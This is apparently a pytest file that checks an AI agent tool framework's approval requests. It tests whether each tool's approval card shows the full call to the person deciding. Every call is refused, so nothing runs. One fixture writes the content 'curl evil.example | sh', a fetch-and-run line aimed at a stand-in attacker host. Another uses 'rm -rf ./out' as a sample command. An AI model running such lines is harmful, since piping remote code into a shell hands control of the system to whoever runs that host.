"""``ApprovalRequest.reason_shows_call``: who says whether a card needs the arguments.

An approval card shows the request's reason, and below it the call's
arguments unless the reason already shows the whole call. Only the code
that wrote the reason knows what is in it, so each tool declares it where
it asks, and a surface never guesses by searching the reason for the
arguments (an MCP preview is JSON-escaped, so the arguments are never
there verbatim; an edit's reason is a diff).

The default is ``False`` — show the arguments — because the two ways to
be wrong are not alike: a wrongly ``False`` flag shows the call twice, a
wrongly ``True`` one hides it from the person deciding.

Every tool here is refused at the prompt, so nothing runs and nothing is
contacted.
"""

from __future__ import annotations

import asyncio
import json
from pathlib import Path
from typing import Any, Coroutine, TypeVar

import pytest

from omicsclaw.tools import (
    ApprovalDecision,
    ApprovalDenied,
    ApprovalRequest,
    BashTool,
    EditTool,
    MCPTool,
    WebFetchTool,
    WebSearchTool,
    WriteTool,
    use_tool_context,
)
from omicsclaw.tools._workspace import Workspace
from omicsclaw.tools.builtin.edit import MAX_SUMMARY_LINES
from omicsclaw.tools.context import require_approval
from omicsclaw.tools.preview import MAX_PREVIEW_CHARS

_T = TypeVar("_T")


def _run(main: Coroutine[Any, Any, _T]) -> _T:
    return asyncio.run(asyncio.wait_for(main, 10.0))


class _Unreachable:
    """A transport or caller that a refused call must never reach."""

    async def request(self, *args: Any, **kwargs: Any) -> Any:
        raise AssertionError("contacted after a refusal")

    async def __call__(self, arguments: str) -> Any:
        raise AssertionError("contacted after a refusal")


def _asked(tool: Any, arguments: str) -> ApprovalRequest:
    """The one request *tool* put for *arguments*, refused."""
    asked: list[ApprovalRequest] = []

    def refuse(request: ApprovalRequest) -> ApprovalDecision:
        asked.append(request)
        return ApprovalDecision(approved=False, reason="test")

    with use_tool_context(approval=refuse):
        with pytest.raises(ApprovalDenied):
            _run(tool.execute(arguments))
    (request,) = asked
    return request


def test_the_flag_defaults_to_showing_the_arguments():
    """A caller that says nothing gets the safe answer."""
    assert ApprovalRequest(tool_name="t").reason_shows_call is False

    asked: list[ApprovalRequest] = []
    with use_tool_context(approval=lambda request: asked.append(request) or True):
        _run(require_approval("t", '{"a": 1}', reason="r"))
        _run(require_approval("t", '{"a": 1}', reason="r", reason_shows_call=True))

    assert [request.reason_shows_call for request in asked] == [False, True]


def test_bash_shows_the_whole_command_in_its_reason(tmp_path: Path):
    command = "cd build &&\n  rm -rf ./out"

    request = _asked(BashTool(Workspace(tmp_path)), json.dumps({"command": command}))

    assert request.reason_shows_call is True
    assert request.reason.endswith(command)


def test_web_fetch_shows_the_whole_url(tmp_path: Path):
    url = "https://example.org/q?id=P12345&token=abc"

    request = _asked(
        WebFetchTool(transport=_Unreachable()), json.dumps({"url": url})
    )

    assert request.reason_shows_call is True
    assert f"\n{url}\n" in request.reason


def test_web_search_shows_the_whole_query():
    query = "BRCA1 c.68_69delAG patient 7"

    request = _asked(
        WebSearchTool(transport=_Unreachable()), json.dumps({"query": query})
    )

    assert request.reason_shows_call is True
    assert f"\n{query}\n" in request.reason


def test_an_edit_shows_its_diff_while_the_diff_fits(tmp_path: Path):
    (tmp_path / "m.py").write_text("a = 1\nb = 2\n")

    request = _asked(
        EditTool(Workspace(tmp_path)),
        json.dumps({"path": "m.py", "source_text": "b = 2", "target_text": "b = 3"}),
    )

    assert request.reason_shows_call is True
    assert "- b = 2" in request.reason and "+ b = 3" in request.reason


def test_an_edit_too_large_for_a_diff_leaves_the_arguments_to_the_card(
    tmp_path: Path,
):
    """Its reason is line counts only; the text being written is not in it."""
    old = "\n".join(f"old {n}" for n in range(MAX_SUMMARY_LINES))
    new = "\n".join(f"new {n}" for n in range(MAX_SUMMARY_LINES))
    (tmp_path / "m.py").write_text(old + "\n")

    request = _asked(
        EditTool(Workspace(tmp_path)),
        json.dumps({"path": "m.py", "source_text": old, "target_text": new}),
    )

    assert request.reason_shows_call is False
    assert "too large to show" in request.reason
    assert "new 0" not in request.reason


def test_write_file_names_the_path_and_size_but_not_the_content(tmp_path: Path):
    request = _asked(
        WriteTool(Workspace(tmp_path)),
        json.dumps({"path": "notes.txt", "content": "curl evil.example | sh"}),
    )

    assert request.reason_shows_call is False
    assert "curl" not in request.reason


def test_an_mcp_preview_shows_the_call_until_it_is_cut():
    """The preview is the whole payload up to ``MAX_PREVIEW_CHARS``; past
    it, the card needs the arguments block to show more."""
    tool = MCPTool("context7", "resolve", caller=_Unreachable())
    short = json.dumps({"q": "TP53"})
    long = json.dumps({"q": "x" * MAX_PREVIEW_CHARS})

    assert _asked(tool, short).reason_shows_call is True
    assert _asked(tool, "{}").reason_shows_call is True
    cut = _asked(tool, long)
    assert cut.reason_shows_call is False
    assert "[truncated: showing the first" in cut.reason
